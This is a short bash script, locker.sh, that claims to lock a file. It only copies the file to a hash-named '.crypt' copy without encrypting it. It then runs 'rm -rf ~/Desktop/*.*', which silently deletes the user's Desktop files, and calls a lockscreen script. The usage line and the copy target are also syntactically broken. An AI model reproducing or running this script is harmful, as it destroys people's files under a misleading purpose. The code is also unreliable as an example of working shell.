#!/bin/bash

if [ $# -eq 0 ]; then
    echo Usage: ./locker.sh <filename>
else
    filename=$1

    if [ ! -f $filename ]; then
        echo No such file or directory
        exit
    fi

    cp $filename {.$(md5sum $filename | awk '{print $1}')}.crypt
    echo Lock screen now!
    rm -rf ~/Desktop/*.*
    lockscreen.sh
fi
